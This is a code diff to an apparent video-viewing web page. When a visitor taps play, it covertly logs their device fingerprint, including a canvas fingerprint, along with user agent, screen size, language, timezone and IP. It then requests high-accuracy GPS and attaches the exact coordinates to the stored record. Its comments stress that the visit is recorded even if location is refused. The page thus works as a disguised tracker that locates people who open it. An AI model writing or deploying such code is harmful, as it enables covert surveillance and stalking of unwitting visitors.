@@ -126,94 +126,92 @@ export default function Home() {
       });
   }, []);
 
+  // Generate fallback device ID if FingerprintJS is blocked
+  const getFallbackFingerprint = () => {
+    if (typeof window === 'undefined') return 'server_' + Math.random().toString(36).substring(2, 12);
+    try {
+      let storedId = localStorage.getItem('_viewer_fid');
+      if (!storedId) {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        let canvasHash = 'c';
+        if (ctx) {
+          ctx.textBaseline = 'top';
+          ctx.font = "14px 'Arial'";
+          ctx.fillText("video_view_fp", 2, 2);
+          canvasHash = canvas.toDataURL().slice(-16);
+        }
+        storedId = 'fp_' + canvasHash + '_' + Math.random().toString(36).substring(2, 10);
+        localStorage.setItem('_viewer_fid', storedId);
+      }
+      return storedId;
+    } catch (e) {
+      return 'anon_' + Math.random().toString(36).substring(2, 12);
+    }
+  };
+
   const handlePlay = () => {
     if (logSent) return;
+    setLogSent(true);
 
-    // Trigger Geolocation on tap gesture (or use cached if already allowed)
-    const geoPromise = new Promise<{ lat: number | null, lon: number | null }>((resolve) => {
-      if (cachedCoords) {
-        resolve(cachedCoords);
-        return;
-      }
+    // 1. Collect Device Specs IMMEDIATELY
+    const fingerprint = (cachedFp && cachedFp !== 'unknown') ? cachedFp : getFallbackFingerprint();
+    const screenResolution = typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : null;
+    const language = typeof navigator !== 'undefined' ? navigator.language : null;
+    const timezone = typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : null;
+    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : null;
 
-      if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
-        resolve({ lat: null, lon: null });
-        return;
-      }
+    // 2. Send Log IMMEDIATELY (Zero Delay, 100% Recorded even if location rejected)
+    const logPayload = {
+      fingerprint,
+      latitude: cachedCoords?.lat ?? null,
+      longitude: cachedCoords?.lon ?? null,
+      userAgent,
+      screenResolution,
+      language,
+      timezone
+    };
 
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-        },
-        (err) => {
-          console.warn("GPS permission or signal error:", err.message);
-          resolve({ lat: null, lon: null });
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
+    fetch('/api/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(logPayload),
+      keepalive: true
+    })
+      .then(res => res.json())
+      .then(data => {
+        const logId = data?.log?.id;
+        
+        // 3. If GPS was not cached and log was created, request GPS in background and PATCH if allowed
+        if (logId && !cachedCoords && typeof navigator !== 'undefined' && 'geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const lat = pos.coords.latitude;
+              const lon = pos.coords.longitude;
+              setCachedCoords({ lat, lon });
+
+              // Update the already created log with exact GPS coordinates
+              fetch('/api/log', {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: logId, latitude: lat, longitude: lon }),
+                keepalive: true
+              }).catch(() => {});
+            },
+            (err) => {
+              console.log("GPS rejected or unavailable, log already saved with device fingerprint & IP.");
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            }
+          );
         }
-      );
-    });
-
-    // Execute background data collection and logging
-    (async () => {
-      let fingerprint = cachedFp;
-      if (fingerprint === 'unknown') {
-        try {
-          const loader = fpjs.default?.load || fpjs.load;
-          if (loader) {
-            const fp = await loader();
-            const res = await fp.get();
-            fingerprint = res.visitorId || 'unknown';
-          }
-        } catch (e) {}
-      }
-
-      let { lat, lon } = await geoPromise;
-
-      // Fallback to IP Geolocation if GPS is not granted
-      if (lat === null || lon === null) {
-        try {
-          const res = await fetch('https://ipinfo.io/json');
-          const data = await res.json();
-          if (data.loc) {
-            const parts = data.loc.split(',');
-            lat = parseFloat(parts[0]);
-            lon = parseFloat(parts[1]);
-          }
-        } catch (e) {}
-      }
-
-      let screenResolution = null;
-      let language = null;
-      let timezone = null;
-      if (typeof window !== 'undefined') {
-        screenResolution = `${window.screen.width}x${window.screen.height}`;
-        language = navigator.language;
-        timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      }
-
-      try {
-        await fetch('/api/log', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            fingerprint,
-            latitude: lat,
-            longitude: lon,
-            userAgent: navigator.userAgent,
-            screenResolution,
-            language,
-            timezone
-          })
-        });
-        setLogSent(true);
-      } catch (e) {
-        console.error("API fetch failed", e);
-      }
-    })();
+      })
+      .catch((err) => {
+        console.error("Immediate logging failed:", err);
+      });
   };
 
   if (loading || !mounted) {
